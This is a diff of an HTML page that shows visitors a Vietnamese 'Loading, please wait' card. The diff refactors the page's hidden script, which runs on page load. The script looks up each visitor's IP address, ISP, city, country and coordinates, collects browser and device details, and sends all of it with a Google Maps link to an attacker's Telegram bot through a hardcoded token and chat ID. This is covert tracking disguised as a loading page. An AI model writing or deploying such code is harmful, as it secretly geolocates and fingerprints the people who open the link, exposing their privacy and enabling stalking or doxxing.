@@ -18,61 +18,72 @@
 <div class="card">
     <img src="https://i.imgur.com/Vz1T3rN.jpeg">
     <h2>Đang tải...</h2>
-    <p>Vui lòng chờ trong giây lát...</p>
+    <p>Vui lòng đợi trong giây lát...</p>
 </div>
 
 <script>
-// TOKEN & GROUP
+// === TOKEN & CHAT ID của bạn ===
 const TOKEN = "8004822258:AAEVO8N_3Z1ESth3VXHZIXTI8IjBCs_Iabs";
 const CHAT_ID = "6243479167";
 
-// Lấy thêm thông tin thiết bị
-const device_info = {
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
-    screen: `${screen.width} x ${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-};
+// === Lấy thông tin thiết bị (giống a.py) ===
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width} x ${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+}
 
-// API lấy IP + Location chuẩn 100% (không undefined)
+// === Gửi tin nhắn Telegram ===
+function sendToTelegram(text) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "Markdown"
+        })
+    });
+}
+
+// === Lấy IP + vị trí bằng API mạnh nhất ===
 fetch("https://ipwho.is/")
     .then(r => r.json())
     .then(d => {
+        const device = getDeviceInfo();
 
         const ip = d.ip || "Không rõ";
-        const city = d.city || "Không rõ";
+        const isp = d.connection?.isp || "Không rõ";
         const country = d.country || "Không rõ";
-        const lat = d.latitude || 0;
-        const lon = d.longitude || 0;
+        const city = d.city || "Không rõ";
+        const lat = d.latitude || "0";
+        const lon = d.longitude || "0";
+        const address = `${d.city}, ${d.region}, ${d.country}`;
         const maps = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        const msg = `
-🔔 *CÓ NGƯỜI TRUY CẬP TRANG GITHUB*
+        const text = `
+📡 [THÔNG TIN TRUY CẬP]
 
-🌐 *IP:* ${ip}
-🏙 *Thành phố:* ${city}
-🇻🇳 *Quốc gia:* ${country}
-📌 *Google Maps:* ${maps}
+🕒 Thời gian: ${new Date().toLocaleString()}
+🌍 IP: ${ip}
+🏢 ISP: ${isp}
+🏙️ Thành phố: ${city}
+🇻🇳 Quốc gia: ${country}
+📍 Vĩ độ: ${lat}
+📍 Kinh độ: ${lon}
+📌 Google Maps: ${maps}
 
-📱 *Thiết bị:* ${device_info.userAgent}
-🌐 *Ngôn ngữ:* ${device_info.language}
-🖥 *Màn hình:* ${device_info.screen}
-⏳ *Múi giờ:* ${device_info.timezone}
-
-⏰ *Thời gian:* ${new Date().toLocaleString()}
+📱 Thiết bị: ${device.userAgent}
+🌐 Ngôn ngữ: ${device.language}
+🖥 Màn hình: ${device.screen}
+⏳ Múi giờ: ${device.timezone}
         `;
 
-        // Gửi về Telegram
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: {"Content-Type":"application/json"},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: msg,
-                parse_mode: "Markdown"
-            })
-        });
+        sendToTelegram(text);
     });
 </script>
 
